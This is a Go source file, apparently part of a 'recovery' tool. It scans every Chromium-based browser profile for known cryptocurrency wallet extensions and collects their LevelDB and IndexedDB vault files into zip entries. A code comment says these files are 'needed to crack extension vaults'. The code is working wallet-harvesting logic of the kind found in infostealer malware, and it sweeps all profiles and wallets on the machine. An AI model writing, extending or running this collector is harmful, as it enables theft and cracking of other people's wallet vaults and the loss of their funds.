package scanner

import (
	"os"
	"path/filepath"
	"strings"

	"recovery/recovery/browser"
)

// WalletExtensionFileEntry is one on-disk file to include in a wallet export zip.
type WalletExtensionFileEntry struct {
	SourcePath string
	ZipPath    string
}

// WalletExtensionBundle groups vault-related files for one installed wallet extension.
type WalletExtensionBundle struct {
	WalletName string
	ExtID      string
	Browser    string
	Profile    string
	Entries    []WalletExtensionFileEntry
}

const maxWalletExportFileSize = 10 * 1024 * 1024 // 10 MB per file

// CollectWalletExtensionBundles returns LevelDB / IndexedDB files needed to crack extension vaults.
// Only installed extensions from knownWalletExtensions are included.
func CollectWalletExtensionBundles() []WalletExtensionBundle {
	var bundles []WalletExtensionBundle
	for _, cfg := range browser.Browsers {
		if cfg.IsFirefox {
			continue
		}
		for _, profile := range browser.FindProfileDirs(cfg) {
			installed := findInstalledWalletExtensions(profile.Path)
			for extID, walletName := range installed {
				var entries []WalletExtensionFileEntry
				lesDir := filepath.Join(profile.Path, "Local Extension Settings", extID)
				entries = append(entries, collectWalletDataFiles(lesDir, "local-extension-settings")...)

				idbRoot := filepath.Join(profile.Path, "IndexedDB")
				entries = append(entries, collectIndexedDBWalletFiles(idbRoot, extID)...)

				if len(entries) == 0 {
					continue
				}
				bundles = append(bundles, WalletExtensionBundle{
					WalletName: walletName,
					ExtID:      extID,
					Browser:    cfg.Name,
					Profile:    profile.Name,
					Entries:    entries,
				})
			}
		}
	}
	return bundles
}

func findInstalledWalletExtensions(profilePath string) map[string]string {
	installed := make(map[string]string)

	lesRoot := filepath.Join(profilePath, "Local Extension Settings")
	if entries, err := os.ReadDir(lesRoot); err == nil {
		for _, e := range entries {
			if !e.IsDir() {
				continue
			}
			if name, ok := knownWalletExtensions[e.Name()]; ok {
				installed[e.Name()] = name
			}
		}
	}

	idbRoot := filepath.Join(profilePath, "IndexedDB")
	if entries, err := os.ReadDir(idbRoot); err == nil {
		for _, e := range entries {
			if !e.IsDir() {
				continue
			}
			lower := strings.ToLower(e.Name())
			for extID, walletName := range knownWalletExtensions {
				if _, ok := installed[extID]; ok {
					continue
				}
				if strings.Contains(lower, strings.ToLower(extID)) && strings.Contains(lower, "indexeddb.leveldb") {
					installed[extID] = walletName
				}
			}
		}
	}

	return installed
}

func collectIndexedDBWalletFiles(idbRoot, extID string) []WalletExtensionFileEntry {
	entries, err := os.ReadDir(idbRoot)
	if err != nil {
		return nil
	}
	extLower := strings.ToLower(extID)
	var out []WalletExtensionFileEntry
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		name := strings.ToLower(e.Name())
		if !strings.Contains(name, extLower) || !strings.Contains(name, "indexeddb.leveldb") {
			continue
		}
		dir := filepath.Join(idbRoot, e.Name())
		prefix := "indexeddb/" + e.Name()
		out = append(out, collectWalletDataFiles(dir, prefix)...)
	}
	return out
}

func collectWalletDataFiles(dir, zipPrefix string) []WalletExtensionFileEntry {
	var out []WalletExtensionFileEntry
	_ = filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		if info.Size() == 0 || info.Size() > maxWalletExportFileSize {
			return nil
		}
		base := filepath.Base(path)
		if !isWalletVaultFile(base) {
			return nil
		}
		rel, err := filepath.Rel(dir, path)
		if err != nil {
			rel = base
		}
		zipPath := zipPrefix + "/" + filepath.ToSlash(rel)
		out = append(out, WalletExtensionFileEntry{
			SourcePath: path,
			ZipPath:    zipPath,
		})
		return nil
	})
	return out
}

func isWalletVaultFile(name string) bool {
	lower := strings.ToLower(name)
	switch lower {
	case "current", "log", "log.old":
		return true
	}
	if strings.HasPrefix(lower, "manifest") {
		return true
	}
	ext := filepath.Ext(lower)
	return ext == ".ldb" || ext == ".log"
}